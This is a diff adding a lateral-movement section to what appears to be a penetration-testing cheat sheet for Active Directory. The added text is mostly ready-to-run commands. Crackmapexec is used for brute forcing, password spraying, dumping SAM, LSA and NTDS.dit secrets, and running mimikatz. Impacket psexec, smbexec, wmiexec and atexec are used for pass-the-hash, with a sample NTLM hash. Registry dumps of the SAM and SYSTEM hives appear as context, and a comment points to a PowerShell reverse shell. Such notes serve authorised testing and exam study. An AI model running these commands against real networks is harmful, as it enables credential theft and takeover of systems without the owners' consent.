@@ -1122,6 +1122,67 @@ reg save hklm\sam c:\Temp\sam
 reg save hklm\system c:\Temp\system
 ```
 
+## Lateral Movement in AD\
+
+### Crackmapexec
+```javascript
+crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp} #supported services
+crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success # Bruteforcing attack, smb can be replaced. Shows "Pwned"
+crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success | grep '[+]' #grepping the way out!
+crackmapexec smb <Rhost/range> -u user.txt -p 'password' --continue-on-success  #Password spraying, viceversa can also be done
+
+#Try --local-auth option if nothing comes up
+crackmapexec smb <Rhost/range> -u 'user' -p 'password' --shares #lists all shares, provide creds if you have one
+crackmapexec smb <Rhost/range> -u 'user' -p 'password' --disks
+crackmapexec smb <DC-IP> -u 'user' -p 'password' --users #we need to provide DC ip
+crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sessions #active logon sessions
+crackmapexec smb <Rhost/range> -u 'user' -p 'password' --pass-pol #dumps password policy
+crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sam #SAM hashes
+crackmapexec smb <Rhost/range> -u 'user' -p 'password' --lsa #dumping lsa secrets
+crackmapexec smb <Rhost/range> -u 'user' -p 'password' --ntds #dumps NTDS.dit file
+crackmapexec smb <Rhost/range> -u 'user' -p 'password' --groups {groupname} #we can also run with a specific group and enumerated users of that group.
+crackmapexec smb <Rhost/range> -u 'user' -p 'password' -x 'command' #For executing commands, "-x" for cmd and "-X" for powershell command
+
+#Pass the hash
+crackmapexec smb <ip or range> -u username -H <full hash> --local-auth
+#We can run all the above commands with hash and obtain more information
+
+#crackmapexec modules
+crackmapexec smb -L #listing modules
+crackmapexec smb -M mimikatx --options #shows the required options for the module
+crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz #runs default command
+crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug' #runs specific command-M 
+```
+
+### Winrs
+```javascript
+winrs -r:<computername> -u:<user> -p:<password> "command"
+# run this and check whether the user has access on the machine, if you have access then run a powershell reverse-shell
+# run this on windows session
+```
+### psexec - smbexec - wmiexec - atexec
+Here we can pass the credentials or even hash, depending on what we have
+#### Always pass full hash to these tools!
+```javascript
+psexec.py <domain>/<user>:<password1>@<IP>
+# the user should have write access to Admin share then only we can get sesssion
+
+psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
+#we passed full hash here
+
+smbexec.py <domain>/<user>:<password1>@<IP>
+
+smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
+#we passed full hash here
+
+wmiexec.py <domain>/<user>:<password1>@<IP>
+
+wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
+#we passed full hash here
+
+atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command>
+#we passed full hash here
+```
 
 ### Installed Applications x64 and x86
 ```powershell
